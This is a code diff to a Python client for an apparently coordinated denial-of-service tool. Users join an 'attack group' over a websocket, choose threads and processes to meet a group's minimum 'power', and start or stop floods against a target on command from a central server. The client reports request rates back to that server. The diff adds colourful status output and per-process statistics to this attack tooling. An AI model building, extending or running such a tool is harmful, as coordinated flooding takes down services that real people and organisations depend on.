@@ -1,3 +1,4 @@
+import psutil
 import websocket
 import json
 import os
@@ -18,7 +19,7 @@ groups = {}
 
 cores = os.cpu_count()
 if not cores:
-    print('Failed to retrive CPU count, default: 2')
+    console.log('[red]Failed to retrive CPU count, default: 2')
     cores = 2
 
 suggested_threads = cores * 10
@@ -39,19 +40,19 @@ def print_group(group_name):
         console.clear()
 
         table = Table()
-        table.add_column('Name')
-        table.add_column('Target')
-        table.add_column('Members')
-        table.add_column('Power/Threads')
-        table.add_column('Status')
-        table.add_column('Minimum Power')
+        table.add_column('Name', style='cyan')
+        table.add_column('Target', style='orange3')
+        table.add_column('Members', style='magenta')
+        table.add_column('Power/Threads', style='red')
+        table.add_column('Status', style='cyan')
+        table.add_column('Minimum Power', style='green')
 
         for group in groups:
             info = groups[group]
             name, target, members, power, status, min_power = group, info['target'], str(info['members_count']), str(info['threads']), info['status'], str(info['min_power'])
             table.add_row(name, target, members, power, status, min_power)
         console.print(table)
-        console.print("Join Group - Name >", end='')
+        console.print('[cyan][?][/cyan] Group Name >', end='')
 
         time.sleep(5)
 
@@ -60,13 +61,13 @@ while True:
     group_name[0] = input('')
     if group_name[0] in groups:
         break
-    print('Join Group - Name >', end='')
+    console.print('[cyan][?][/cyan] Group Name >', end='')
 
 min_power = groups[group_name[0]]['min_power']
 while True:
     try:
-        threads = int(input(f'How many threads? (suggested: {suggested_threads})'))
-        processes = int(input(f'How many processes? (suggested: {suggested_processes})'))
+        threads = int(console.input(f'[cyan][?][/cyan] How many threads? (suggested: {suggested_threads})'))
+        processes = int(console.input(f'[cyan][?][/cyan] How many processes? (suggested: {suggested_processes})'))
     except ValueError: continue
 
     if threads * processes < min_power:
@@ -86,6 +87,7 @@ class Attack:
 
     def start_attack(self):
         if self.status: return
+        console.log('[green][+] The attack has been started[/green]')
         self.status = 1
 
         for _ in range(processes):
@@ -98,27 +100,37 @@ class Attack:
 
     def stop_attack(self):
         if not self.status: return
+        console.log('[red][!] The attack has been stopped[/red]')
         self.status = 0
         for pid in self.pids:
             Process(pid).kill()
         
         for pid in self.pids:
-            os.remove(f'{pid}.txt')
+            os.remove(f'pids/{pid}.txt')
 
         self.pids = []
 
     def stalk_stats(self):
+        current_proc = psutil.Process(os.getpid())
+
         old_total_reqs = 0
         last_time = time.time()
         while self.status:
             total_reqs = 0
+            ptable = Table(title='Process Stats')
+            ptable.add_column('PID', style='cyan')
+            ptable.add_column('Reqs', style='magenta')
+            ptable.add_column('Threads', style='magenta')
+            ptable.add_column('CPU Usage', style='orange3')
+
             for pid in self.pids:
                 try:
-                    with open(f'{pid}.txt', 'r') as f:
+                    with open(f'pids/{pid}.txt', 'r') as f:
                         reqs = int(f.read())
                 except:
-                    print(f'Failed to read', pid)
+                    console.log(f'[orange3][-] Failed to read pids/{pid}.txt')
                     continue
+                ptable.add_row(str(pid), str(reqs), str(threads), str(psutil.Process(pid).cpu_percent()))
                 total_reqs += reqs
 
             req_time_count = (total_reqs - old_total_reqs)
@@ -129,11 +141,16 @@ class Attack:
             # req_time_count / time_passed
 
             if time_passed != 0:
-                req_per_second = req_time_count / time_passed
+                req_per_second = round(req_time_count / time_passed, 2)
             else:
                 req_per_second = 0
 
-            print(f'{req_per_second} R/s, total: {total_reqs}')
+            console.clear()
+            console.print(ptable)
+
+            console.print(f'[red][*][/red] Attack Running with {processes * threads} Threads against [orange3]{target}[/orange3]')
+            console.print(f'[red][*][/red] Total Requests: {total_reqs} Req/S: {round(req_per_second, 2)}')
+
             ws.send(json.dumps({'p': 'analytics', 'per_second': req_per_second, 'total': total_reqs}))
             old_total_reqs = total_reqs
             last_time = time.time()
@@ -145,25 +162,27 @@ def on_message(ws, message):
     data = json.loads(message)
 
     if data['p'] == 'joined':
-        print('Succesfully joined')
+        console.log('[green]Succesfully joined')
         if groups[group_name[0]]['status'] != 'RUNNING':
-            print('waiting for the attack to start...')
-
+            console.log('[cyan]waiting for the attack to start...')
+    elif data['p'] == 'identify':
+        console.log(f'Group joined as [magenta]{data["usr"]}[/magenta]')
     elif data['p'] == 'start-attack':
         attack.start_attack()
     elif data['p'] == 'stop-attack':
         attack.stop_attack()
     elif data['p'] == 'kick':
+        console.log('[red][!] You\'ve been kicked from this attack group')
         ws.close()
     elif data['p'] == 'err':
-        print('ERROR: ', data['msg'])
+        console.log('ERROR: ', data['msg'])
 
 def on_error(ws, error):
-    print(error)
+    console.log(f'[red]WebSocket Error: {error}')
     attack.stop_attack()
 
 def on_close(ws, close_status_code, close_msg):
-    print("### closed ###", close_status_code, close_msg)
+    console.log(f"[red][-] Connection Closed {close_status_code=} {close_msg=}")
     attack.stop_attack()
 
 def on_open(ws):
